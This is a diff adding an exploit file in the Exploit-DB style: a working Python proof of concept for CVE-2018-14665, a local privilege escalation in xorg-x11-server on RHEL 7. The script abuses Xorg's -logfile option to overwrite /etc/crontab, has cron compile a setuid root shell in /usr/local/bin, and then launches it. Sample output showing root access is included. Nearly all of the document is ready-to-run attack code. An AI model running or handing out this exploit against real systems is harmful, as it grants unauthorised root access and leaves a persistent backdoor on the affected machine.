@@ -1,0 +1,89 @@
+# Exploit Title: xorg-x11-server < 1.20.1 - Local Privilege Escalation (RHEL 7)
+# Date: 2018-11-07
+# Exploit Author: @bolonobolo
+# Vendor Homepage: https://www.x.org/
+# Version: 1.19.5
+# Tested on: RHEL 7.3 && 7.5
+# CVE : CVE-2018-14665
+# Explanation
+# The only condition that have to be met for this PE to work via SSH, is that the legitimate non-root user 
+# has to be logged in trought console at the moment the PE script launched.
+# In fact during the logged in session of the legitimate non-root user, 
+# a file with the name of the non-root user will be created in the /var/run/console folder. 
+# With that file present, the same non-root user can launch a Xorg command via SSH. 
+# 
+# Usage: $ python poc.py
+# $ python poc.py 
+# [*] Waiting for bolo to connect to the console
+# [*] OK --> bolo console opened
+# [*] Building root shell wait 2 minutes
+# [*] crontab overwritten
+# 
+# ... cut Xorg output ...
+# 
+# [*] Xorg killed
+# (II) Server terminated successfully (0). Closing log file.
+# [*] Don't forget to cleanup /etc/crontab and /tmp dir
+# sh-4.2# id && whoami
+# uid=0(root) gid=0(root) gruppi=0(root),1001(bolo)
+# root
+# sh-4.2#
+
+
+#!/usr/bin/python
+import os
+import getpass
+import subprocess
+
+userList = []
+path="/var/run/console/"
+
+def getWhoami():
+	return getpass.getuser()
+
+def getConsole(path):
+	p = subprocess.Popen(["ls", path], stdout=subprocess.PIPE)
+	(console, err) = p.communicate()
+	consoleList = str.splitlines(console)
+	return consoleList
+
+def payload():
+	f = open("/tmp/payload", "w")
+	payload = ("cp /bin/sh /usr/local/bin/shell\n" 
+			"echo \"#include <stdio.h> \" > /tmp/shell.c\n"
+   			"echo \"#include <stdlib.h>\" >> /tmp/shell.c\n"
+   			"echo \"#include <sys/types.h>\" >> /tmp/shell.c\n"
+   			"echo \"#include <unistd.h>\" >> /tmp/shell.c\n"
+			"echo 'int main(){setuid(0);setgid(0);system(\"/bin/sh\");}' >> /tmp/shell.c\n"
+			"gcc /tmp/shell.c -o /usr/local/bin/shell\n"
+			"chmod 4777 /usr/local/bin/shell\n")
+	f.write(payload)	
+	
+def executePayload():	
+	os.system("chmod +x /tmp/payload")
+	os.system("cd /etc; Xorg -fp \"* * * * * root /tmp/payload\" -logfile crontab :1 &")
+	print "[*] crontab overwritten"
+	os.system("sleep 5")
+	os.system("pkill Xorg")
+	print "[*] Xorg killed"
+	os.system("sleep 120")
+	return
+
+def main():
+	whoami = getWhoami()
+	print "[*] Waiting for " + whoami + " to connect to the console"
+	i = 0
+	while (i == 0):
+		consoleList = getConsole(path)
+		for user in consoleList:
+			if user == whoami :
+				print "[*] OK --> " + user + " console opened"
+				i = 1
+	print "[*] Building root shell wait 2 minutes"
+	payload()
+	executePayload()
+	print "[*] Don't forget to cleanup /etc/crontab and /tmp dir"
+	os.system("/usr/local/bin/shell")			
+
+if __name__ == '__main__':
+	main()
